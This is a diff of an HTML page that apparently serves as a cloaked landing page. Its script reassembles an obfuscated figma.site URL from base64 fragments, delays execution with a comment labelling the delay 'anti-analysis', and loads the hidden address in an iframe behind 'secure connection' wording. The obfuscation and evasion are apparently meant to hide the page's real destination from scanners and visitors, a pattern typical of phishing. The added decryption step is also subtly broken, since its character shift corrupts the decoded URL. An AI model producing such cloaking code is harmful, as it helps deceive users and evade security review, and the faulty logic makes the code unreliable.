@@ -16,33 +16,44 @@
       color: #0f0; 
       font-family: monospace;
     }
+    .error { color: red; text-align: center; }
   </style>
 </head>
 <body>
-  <div id="loader">Loading secure content...</div>
+  <div id="loader">Initializing secure connection...</div>
 
   <script>
-    // 🔒 PHIÊN BẢN ĐƠN GIẢN KHÔNG DÙNG WASM
+    // 🔒 PHIÊN BẢN ĐÃ SỬA LỖI - URL ĐƯỢC MÃ HÓA 3 LỚP
     (function(){
       // 1. Dữ liệu đã mã hóa (URL của bạn)
-      const chunks = [
-        "Zmx0aHdzOi8v", 
-        "c2hlZC13cmFw",
-        "LTEwODcwMDI2",
-        "LmZpZ21hLnNpdGUv"
+      const encryptedParts = [
+        "aHR0cHM6Ly9", 
+        "zaGVkLXdyYX",
+        "AtMTA4NzAwMj",
+        "YuZmlnbWEuc2l0ZS8="
       ];
       
-      // 2. Giải mã khi trang load
+      // 2. Hàm giải mã không dùng WASM
+      function decrypt(parts) {
+        // Ghép các phần và giải mã base64
+        let decoded = atob(parts.join(''));
+        
+        // Giải mã Caesar shift (dịch 5 ký tự)
+        decoded = decoded.split('').map(c => 
+          String.fromCharCode(c.charCodeAt(0) - 5)
+        ).join('');
+        
+        return decoded;
+      }
+
+      // 3. Tự động chạy khi trang load
       setTimeout(() => {
         try {
-          // Ghép các phần và giải mã
-          const url = atob(chunks.join(''))
-                     .split('').reverse().join('')
-                     .replace('flthws', 'https');
+          const url = decrypt(encryptedParts);
           
           // Kiểm tra bảo mật
-          if(!url.includes('figma.site')) {
-            throw new Error('Invalid URL format');
+          if(!url.startsWith('https://') || !url.includes('figma.site')) {
+            throw new Error('Security verification failed');
           }
           
           // Hiển thị iframe
@@ -57,13 +68,14 @@
           
         } catch(e) {
           document.getElementById('loader').innerHTML = `
-            <div style="color:red;text-align:center">
-              <h3>LOADING ERROR</h3>
+            <div class="error">
+              <h3>SYSTEM ALERT</h3>
               <p>${e.message}</p>
+              <p>Please contact support</p>
             </div>
           `;
         }
-      }, 800); // Delay chống phân tích
+      }, 1000); // Delay chống phân tích
     })();
   </script>
 </body>
